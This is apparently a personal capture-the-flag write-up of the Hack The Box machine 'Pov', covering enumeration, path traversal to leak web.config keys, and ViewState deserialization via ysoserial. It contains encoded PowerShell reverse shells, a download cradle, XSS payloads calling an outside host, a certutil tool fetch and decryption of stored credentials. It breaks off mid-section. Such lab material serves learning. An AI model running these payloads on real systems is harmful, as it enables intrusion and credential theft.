@@ -1,0 +1,765 @@
+==
+tags: #windows #lfi
+
+==
+
+* nmap
+** basic
+   #+begin_src bat
+     $ sudo nmap -sV -sC -oA nmap/pov.basic 10.10.11.251
+
+     PORT   STATE SERVICE VERSION
+     80/tcp open  http    Microsoft IIS httpd 10.0
+     | http-methods: 
+     |_  Potentially risky methods: TRACE
+     |_http-server-header: Microsoft-IIS/10.0
+     |_http-title: pov.htb
+     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+   #+end_src
+** full scan
+   #+begin_src bat
+     $ sudo nmap -p- -A -T4 -oA nmap/pov.full 10.10.11.251
+
+     PORT   STATE SERVICE VERSION
+     80/tcp open  http    Microsoft IIS httpd 10.0
+     |_http-server-header: Microsoft-IIS/10.0
+     | http-methods: 
+     |_  Potentially risky methods: TRACE
+     |_http-title: pov.htb
+     Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+     Device type: general purpose
+     Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+     OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+     Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+   #+end_src
+* http server
+  we're presented with a plain-looking page; however, there's a contact form which upon
+  submission, generates this request:
+  #+begin_src
+  GET /js/aos.js.map HTTP/1.1
+  Host: 10.10.11.251
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Connection: keep-alive
+  Priority: u=4
+  Cache-Control: max-age=0
+  #+end_src
+  the [[file:script.js][content]] of the js script is obfuscated:
+* gobuster
+  #+begin_src bat
+    $ gobuster dir -u http://10.10.11.251 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+  #+end_src
+  just finds the usual stuff.
+* the contact form
+  next to it there's this line:
+  #+begin_src 
+  If you want to know more about who is behind this project you can check my profile at
+  dev.pov.htb. Additionally you can send us an email with your questions in this contact form.
+  #+end_src
+  i missed it when i was going through the page itself but found it when looking at the page
+  source.
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-10_09-41.png @ 2025-12-10 09:42:15
+  [[file:the_contact_form/2025-12-10_09-42-15_2025-12-10_09-41.png]]
+
+  the email address is also interesting;
+  #+begin_src 
+  sfitz@pov.htb
+  #+end_src
+* dev.pov.htb
+  automatically redirected to =http://dev.pov.htb/portfolio/=; there are several tabs which
+  don't lead anywhere, but the contact form is on a different page:
+  #+begin_src
+  http://dev.pov.htb/portfolio/contact.aspx
+  #+end_src
+** page fuzzing
+   #+begin_src bat
+     ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://dev.pov.htb/FUZZ.aspx -fc 302 
+   #+end_src
+   use =-fc= to filter out by status
+   returns nothing; check under =portfolio=
+   #+begin_src bat
+     ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://dev.pov.htb/portfolio/FUZZ.aspx -fc 302 
+   #+end_src
+   returns just =contact= and =default=
+* subdomain enumeration 
+  #+begin_src bat
+    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.pov.htb/
+  #+end_src
+  returns nothing
+* vhost fuzzing
+  #+begin_src bat
+    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://pov.htb/ -H 'Host: FUZZ.pov.htb' -fs 12330
+
+    at                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 535ms]
+    stc                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4484ms]
+    luke                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4485ms]
+    advance                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4480ms]
+    :: Progress: [4989/4989] :: Job [1/1] :: 613 req/sec :: Duration: [0:06:35] :: Errors: 
+  #+end_src
+  all of these happen to just lead to the same site. verified by curl:
+  #+begin_src bash
+    $ curl -i -H "Host: at.pov.htb" http://10.10.11.251
+  #+end_src
+* IIS Tilde Enumeration
+  use the [[https://github.com/bitquark/shortscan?tab=readme-ov-file#examples][shortscan]] tool to enumerate other pages:
+  #+begin_src 
+  $ shortscan http://dev.pov.htb
+
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+
+WEB~1.CON            WEB.CON?
+PORTFO~1             PORTFO?
+
+Finished! Requests: 225; Retries: 0; Sent 42727 bytes; Received 97597 bytes
+  #+end_src
+  tried =WEB.CONF= but it doesn't exist
+* contact form on dev.pov.htb
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-10_11-28.png @ 2025-12-10 11:28:30
+  [[file:contact_form_on_dev.pov.htb/2025-12-10_11-28-30_2025-12-10_11-28.png]]
+
+  submission of the form results in this POST call
+  #+begin_src bat
+    POST /portfolio/contact.aspx HTTP/1.1
+
+    Host: dev.pov.htb
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 342
+    Origin: http://dev.pov.htb
+    Connection: keep-alive
+    Referer: http://dev.pov.htb/portfolio/contact.aspx
+    Upgrade-Insecure-Requests: 1
+    Priority: u=0, i
+    __VIEWSTATE=H8AEwcRoKz9ERFHY6ZQHw%2Bxp6XV7sLNXzjzM4i7kn66Ek6gYNKp%2FIZPS6d%2BxH%2FbstWSrXkw4kahJpXbgyc7PwTrp6%2B8%3D&__VIEWSTATEGENERATOR=37310E71&__EVENTVALIDATION=4xxSgiqgbZbKlETTBxTk%2BKaLZxSLe18wrSycTKbu2eLNM0b6MJZKqZ4mOfQ8kqSgKK2eNZ%2B8PaNolrMhlGhMbYdnf2m%2Fp56VyWWbxF8yS3MKk53GvDhlzk0p6GB%2FKGsjel%2FVyQ%3D%3D&message=hi&submit=Send+Message 
+  #+end_src
+* cv download
+  there's a button which allows us to download the dev(s fitz from the email)'s cv:
+  #+begin_src html
+    <a id="download" class="btn btn-primary rounded mt-3" href="javascript:__doPostBack('download','')">Download CV</a>
+  #+end_src
+  the request:
+  #+begin_src bat
+    POST /portfolio/ HTTP/1.1
+    Host: dev.pov.htb
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 357
+    Origin: http://dev.pov.htb
+    Connection: keep-alive
+    Referer: http://dev.pov.htb/portfolio/
+    Upgrade-Insecure-Requests: 1
+    Priority: u=0, i
+    __EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=k9%2FuNH1fPpX9XaBZ4wwD%2FUc939w1xjmIPqshlxuXhywESg2fuu7xv9je2HSpfZhIrJkDxfsfCavsJW6iuQrVw1I6FPQ%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=kMEtsdrjchDRwSOkJmNJcsjdkNcT1HTDnRcYcXkK5xfq82lOksGRCPW%2BLNOANw0iKqQFWEOhTdAokPjkYiAx3ji8%2FoMVbHf71g5Oo89uawnhn5AF96gP%2BsrucNRwQzvsvFVABA%3D%3D&file=cv.pdf
+  #+end_src
+* filename fuzz
+  let's see if we can download other files. save the request in a file, with =FUZZ= as filename:
+  #+begin_src bat
+    $ cat fuzz-filename.txt 
+
+    POST /portfolio/ HTTP/1.1
+    Host: dev.pov.htb
+    User-Agent: ffuf
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 999
+
+    __EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=k9%2FuNH1fPpX9XaBZ4wwD%2FUc939w1xjmIPqshlxuXhywESg2fuu7xv9je2HSpfZhIrJkDxfsfCavsJW6iuQrVw1I6FPQ%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=kMEtsdrjchDRwSOkJmNJcsjdkNcT1HTDnRcYcXkK5xfq82lOksGRCPW%2BLNOANw0iKqQFWEOhTdAokPjkYiAx3ji8%2FoMVbHf71g5Oo89uawnhn5AF96gP%2BsrucNRwQzvsvFVABA%3D%3D&file=FUZZ
+  #+end_src
+  run =ffuf=
+  #+begin_src bat
+    $ ffuf -request fuzz-filename.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://dev.pov.htb/portfolio/ -fs 168
+  #+end_src
+  we know http://dev.pov.htb/portfolio/cv.pdf is the URL for the pdf doc; let's see if we can
+  fuzz for other pdf documents.
+  #+begin_src bat
+    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://dev.pov.htb/portfolio/FUZZ.pdf
+
+    cv
+  #+end_src
+  only returns cv.
+* fuzz filename AND extension
+  #+begin_src bat
+    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZ2 -u http://dev.pov.htb/portfolio/FUZZ.FUZ2 -fc 302
+  #+end_src
+  no hits.
+* xss payloads in the contact form
+  #+begin_src html
+    <script src=http://10.10.16.6></script>
+    '><script src=http://10.10.16.6></script>
+    "><script src=http://10.10.16.6></script>
+    javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.6\';document.body.appendChild(a)')
+    <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.16.6");a.send();</script>
+    <script>$.getScript("http://10.10.16.6")</script>
+  #+end_src
+* port 8080
+  #+begin_src 
+  $ sudo nmap -P 8080 -sV -sC -oA nmap/port8080 10.10.11.251
+  #+end_src
+  unreachable
+* download web.config
+  supplying the path =..\web.config= resulted in the file =_web.config= being downloaded; 
+  we had previously tried =../web.conifg=; here are the contents:
+  #+begin_src xml
+  <configuration>
+    <system.web>
+      <customErrors mode="On" defaultRedirect="default.aspx" />
+      <httpRuntime targetFramework="4.5" />
+      <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+    </system.web>
+    <system.webServer>
+        <httpErrors>
+            <remove statusCode="403" subStatusCode="-1" />
+            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
+        </httpErrors>
+        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
+    </system.webServer>
+  </configuration>
+  #+end_src
+* absolute paths
+  relative paths were not working but absolute paths do. tried many variations of
+  =..\..\Windows.ini= which didn't work but =C:\Windows\win.ini= did.
+  however, =C:\Users\sfitz\Desktop\user.txt= didn't work
+* ysoserial
+  with the information from the =web.config= page, i.e. the =decryptionKey= and the =validationKey=,
+  it's possible to generate a =ViewState= payload; [[https://github.com/pwntester/ysoserial.net/releases/tag/v1.36][ysoserial]] is a tool which helps with this. 
+  i used it on the windows machine and transferred the generated base64 file to kali.
+  #+begin_src bat
+  PS > $cmd = "powershell -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/shell.ps1')`""
+  PS > $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+  PS > $payload_b64 = [Convert]::ToBase64String($bytes)
+  PS > $payload_b64
+cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBzAGgAZQBsAGwALgBwAHMAMQAnACkAIgA=
+  PS > .\ysoserial.exe -p ViewState `
+  >>   -g TypeConfuseDelegate `
+  >>   --generator 8E0F0FA3 `
+  >>   --validationalg SHA1 `
+  >>   --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 `
+  >>   --decryptionalg AES `
+  >>   --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 `
+  >>   -c "powershell -encodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBzAGgAZQBsAGwALgBwAHMAMQAnACkAIgA=" > evil_viewstate.b64
+  #+end_src
+  then use this =VIEWSTATE= in one of the POST calls after setting up a python server with the
+  powershell script and an nc listener
+  #+begin_src bat
+  $ curl -i -s -k -X POST "http://dev.pov.htb/portfolio/" \
+  -H "Host: dev.pov.htb"
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "__VIEWSTATE=${EVIL}" \
+  --data-urlencode "__EVENTVALIDATION=BI9vWSguSrRoIF9XOrVys7AUZeHZaky1bxjjFZ99f/fgwQ99oFXE7ebjLmQ9mwvYcYs5+kv7p8HfoMTnrccOz/cJ2jZsXe0F8jj4oo1mlzLHoCM50aWNdEZFIPJenPinZEcUuw==" \
+  --data-urlencode "__VIEWSTATEGENERATOR=8E0F0FA3" \
+  --data-urlencode "__EVENTTARGET=download" \
+  --data-urlencode "file=cv.pdf"
+
+HTTP/1.1 302 Found
+Cache-Control: private
+Content-Type: text/html; charset=utf-8
+Location: /default.aspx?aspxerrorpath=/portfolio/default.aspx
+Server: Microsoft-IIS/10.0
+X-AspNet-Version: 4.0.30319
+X-Powered-By: ASP.NET
+Date: Fri, 12 Dec 2025 10:05:50 GMT
+Content-Length: 168
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="/default.aspx?aspxerrorpath=/portfolio/default.aspx">here</a>.</h2>
+</body></html>
+  #+end_src
+  try it on the form submission endpoint as well
+  #+begin_src bat
+  $ curl -i -s -k -X POST "http://dev.pov.htb/portfolio/contact.aspx" \
+  -H "Host: dev.pov.htb" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "__VIEWSTATE=${EVIL}" \
+  --data-urlencode "__VIEWSTATEGENERATOR=37310E71" \
+  --data-urlencode "__EVENTVALIDATION=5aekGAHL6YThPY6s/V9i/b4ofm24lQ2uMxk75PVHhcNVatIzBtq/S7WuX/k+rhPEUWm/Ng/i32oM5XImnVbTqAaBtcVoTqoLvyGW81Vt6kmEwjqKap/brK1ey7TywfVkCzy0ag==" \
+  --data-urlencode "message=hi" \
+  --data-urlencode "submit=Send Message"
+  #+end_src
+  same result. so, changing the =VIEWSTATE= affects the response -
+  #+begin_src 
+  curl -i -s -k -X POST "http://dev.pov.htb/portfolio/contact.aspx" \
+  -H "Host: dev.pov.htb" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "__VIEWSTATE=test" \
+  --data-urlencode "__VIEWSTATEGENERATOR=37310E71" \
+  --data-urlencode "__EVENTVALIDATION=5aekGAHL6YThPY6s/V9i/b4ofm24lQ2uMxk75PVHhcNVatIzBtq/S7WuX/k+rhPEUWm/Ng/i32oM5XImnVbTqAaBtcVoTqoLvyGW81Vt6kmEwjqKap/brK1ey7TywfVkCzy0ag==" \
+  --data-urlencode "message=hi" \
+  --data-urlencode "submit=Send Message"
+  #+end_src
+  looks like the =VIEWSTATE= is not deserialized on the backend. in any case, this doesn't look
+  like a potential attack vector.
+* back to ysoserial
+  maybe try issuing a powershell command directly instead of fetching it via HTTP?
+  #+begin_src bat
+  PS > .\ysoserial.exe -p ViewState -g TypeConfuseDelegate --generator 8E0F0FA3 --validationalg SHA1 --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg AES --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 -c `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+  #+end_src
+  this stuff now gets blocked by the windows antivirus.
+* guided mode
+  #+begin_src 
+  What is the ASP.NET method used by this site to preserve context data between HTTP round
+  trips
+  #+end_src
+  this made me realize we didn't actually see the code for this logic in the =aspx= files we
+  downloaded. looking at it again, there's a section at the top for a =CodeFile=;
+  the first line of =contact.aspx=:
+  #+begin_src bat
+<%@ Page Language="C#" AutoEventWireup="true" CodeFile="contact.aspx.cs" Inherits="contact" %>
+  #+end_src
+  similarily, for the =default.aspx= page, the corresponding CodeFile is called =index.aspx.cs=
+  however, there's nothing particularly interesting in these pages.
+  anyway, the answer to the question is [[https://learn.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)][view state]]:
+  #+begin_src 
+  View state is the method that the ASP.NET page framework uses to preserve page and control
+  values between round trips.
+  #+end_src
+  also, this looks like it's heading in the direction we already took and discarded because we
+  couldn't get it to work.
+* ysoserial
+  run the previous command from flare-vm, and use the generated viewstate in the intercepted
+  request in both post calls; however, there's no reverse shell.
+* hint
+  #+begin_src 
+  Perform a deserialization attack against the View State implementation. All the information 
+  needed is in the web.config. Make sure you include the --path option
+  #+end_src
+  the =--path= option is what we failed to supply to ysoserial, so:
+  #+begin_src bat
+  PS > .\ysoserial.exe -p ViewState -g TypeConfuseDelegate --generator 8E0F0FA3 --validationalg SHA1 --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg AES --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43  --path='/portfolio/contact.aspx' -c `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+  #+end_src
+  but the output here is the same as before. check if it's working for something simpler:
+  #+begin_src bat
+  PS > .\ysoserial.exe -p ViewState -g TypeConfuseDelegate --generator 8E0F0FA3 --validationalg SHA1 --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg AES --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43  --path='/portfolio/contact.aspx' -c 'type "Hello" > .\hi.txt'
+  #+end_src
+  nope. can't download this file.
+  checked the official solution and they use the base64 version of the powershell reverse 
+  shell from revshells.com, also note the additional parameters =--apppath= and =--path=
+  #+begin_src bat
+  PS > .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio" --apppath="/" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --decryptionalg="AES" --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --islegacy --isdebug
+  #+end_src
+  FUCK. finally got this to work - the issue in the above command when i first ran it was 
+  neither =validationkey= nor =decryptionkey= were wrapped in quotes.
+  NOTE:the above command which was mostly copied from the official pdf was run via =wine= from
+  the linux terminal and that's probably why it lacked the quotes.
+  #+begin_src bat
+  $ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.251] 49671
+whoami
+pov\sfitz
+PS C:\windows\system32\inetsrv> 
+  #+end_src
+* user flag
+  it does not exist on sfitz's desktop; it turns out there's another user present on the 
+  system named =alaading= who we must find a way to pivot to. let's download and run lazagne
+  #+begin_src bat
+  certutil -urlcache -split -f "http://10.10.16.6:8123/lazagne.exe" C:\Windows\Temp\lazagne.exe
+  #+end_src
+  fails immediately:
+  #+begin_src bat
+    C:\Windows\Temp\lazagne.exe all
+
+    0 passwords have been found.
+  #+end_src
+  let's search for =password= string in files
+  #+begin_src bat
+  PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+  #+end_src
+** history files
+   #+begin_src bat
+type C:\Users\alaading\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+   #+end_src
+   no response.
+** just look at sfitz's home directory
+   #+begin_src bat
+   PS C:\Users\sfitz> type Documents\connection.xml
+   #+end_src
+   #+begin_src xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+   #+end_src
+   *how come this didn't show up in the search for the password string?* chatgpt suggests using
+   the native powershell =Select-String= like so:
+   #+begin_src bat
+   Get-ChildItem -Recurse -Include *.config,*.xml | Select-String -Pattern "password" -CaseSensitive:$false
+   #+end_src
+** decrypt powershell creds
+   #+begin_src bat
+   PS C:\Users\sfitz> $credential = Import-Clixml -Path Documents\connection.xml
+   PS C:\Users\sfitz> $credential.GetNetworkCredential().password
+
+f8gQ8fynP44ek1m3
+   #+end_src
+* get shell as alaading
+** runas to get a reverse shell
+ #+begin_src bat
+ runas /user:alaading "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+ #+end_src
+ however, =runas= just causes our shell to hang and we don't receive a connection back either.
+ this is true even for getting cmd as the new user.
+ #+begin_src bat
+ runas /user:alaading cmd
+ #+end_src
+** use scheduled tasks
+   #+begin_src bat
